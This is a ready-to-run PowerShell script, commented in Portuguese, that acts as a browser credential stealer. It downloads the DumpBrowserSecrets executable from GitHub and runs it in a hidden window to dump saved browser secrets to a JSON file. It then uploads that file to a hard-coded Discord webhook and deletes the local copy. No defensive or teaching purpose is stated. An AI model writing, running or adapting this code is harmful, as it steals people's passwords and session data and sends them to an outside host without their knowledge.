# send_browser_data.ps1
# Execute como Administrador

# ==================================================
# CONFIGURAÇÕES
# ==================================================
$WebhookUrl = "https://discord.com/api/webhooks/1527718727204999299/nVc21-8bK1MfgI1Ybw5hZYG3KU0xuEZZalMATPdxY-jJFizPZn_sZiObl0UEUaGRRMdA"
$InstallFolder = "C:\ProgramData\DumpBrowserSecrets"
$DumpExe = "$InstallFolder\DumpBrowserSecrets.exe"
$DumpUrl = "https://github.com/Maldev-Academy/DumpBrowserSecrets/releases/latest/download/DumpBrowserSecrets.exe"
$TempFolder = $env:TEMP
$OutputFile = "$TempFolder\browser_data.json"

# ==================================================
# 0. CRIA A PASTA E BAIXA O EXECUTÁVEL
# ==================================================
Write-Host "[0] Preparando ambiente..." -ForegroundColor Cyan

# Cria a pasta se não existir
if (-not (Test-Path $InstallFolder)) {
    New-Item -ItemType Directory -Path $InstallFolder -Force | Out-Null
}

# Verifica se o executável já existe; se não, baixa
if (-not (Test-Path $DumpExe)) {
    Write-Host "Baixando DumpBrowserSecrets.exe..." -ForegroundColor Yellow
    try {
        Invoke-WebRequest -Uri $DumpUrl -OutFile $DumpExe -ErrorAction Stop
        Write-Host "Download concluído." -ForegroundColor Green
    } catch {
        Write-Host "ERRO ao baixar o executável: $_" -ForegroundColor Red
        exit 1
    }
} else {
    Write-Host "Executável já existe em: $DumpExe" -ForegroundColor Green
}

# ==================================================
# 1. EXECUTA O DUMPBROWSERSECRETS
# ==================================================
Write-Host "[1] Executando DumpBrowserSecrets..." -ForegroundColor Cyan

# Se o arquivo de saída já existir, remove
if (Test-Path $OutputFile) { Remove-Item $OutputFile -Force }

# Executa o DumpBrowserSecrets
$process = Start-Process -FilePath $DumpExe -ArgumentList "/o `"$OutputFile`"" -Wait -PassThru -WindowStyle Hidden

if ($process.ExitCode -ne 0) {
    Write-Host "ERRO: DumpBrowserSecrets falhou com código $($process.ExitCode)" -ForegroundColor Red
    exit 1
}

# Verifica se o arquivo foi gerado
if (-not (Test-Path $OutputFile)) {
    Write-Host "ERRO: Arquivo de saída não foi gerado." -ForegroundColor Red
    exit 1
}

Write-Host "Arquivo gerado: $OutputFile" -ForegroundColor Green

# ==================================================
# 2. ENVIA PARA O DISCORD
# ==================================================
Write-Host "[2] Enviando para o Discord..." -ForegroundColor Cyan

# Lê o arquivo como bytes
$fileBytes = [System.IO.File]::ReadAllBytes($OutputFile)
$fileName = "browser_data_$(Get-Date -Format 'yyyyMMdd_HHmmss').json"

# Monta o multipart/form-data
$boundary = "---------------------------$([System.DateTime]::Now.Ticks.ToString('x'))"
$bodyLines = @()

# Adiciona o arquivo
$bodyLines += "--$boundary"
$bodyLines += "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`""
$bodyLines += "Content-Type: application/json"
$bodyLines += ""
$bodyLines += [System.Text.Encoding]::UTF8.GetString($fileBytes)
$bodyLines += "--$boundary--"

$body = [string]::Join("`r`n", $bodyLines)
$headers = @{
    "Content-Type" = "multipart/form-data; boundary=$boundary"
}

try {
    $response = Invoke-RestMethod -Uri $WebhookUrl -Method Post -Headers $headers -Body $body -ErrorAction Stop
    Write-Host "Arquivo enviado com sucesso!" -ForegroundColor Green
} catch {
    Write-Host "ERRO ao enviar: $_" -ForegroundColor Red
}

# ==================================================
# 3. LIMPEZA
# ==================================================
Write-Host "[3] Limpando arquivo temporário..." -ForegroundColor Cyan
Remove-Item $OutputFile -Force -ErrorAction SilentlyContinue

Write-Host "Pronto!" -ForegroundColor Green

# Opcional: mantém o DumpBrowserSecrets.exe instalado para usar depois
# Se quiser deletar também, descomente:
# Remove-Item -Path $InstallFolder -Recurse -Force -ErrorAction SilentlyContinue
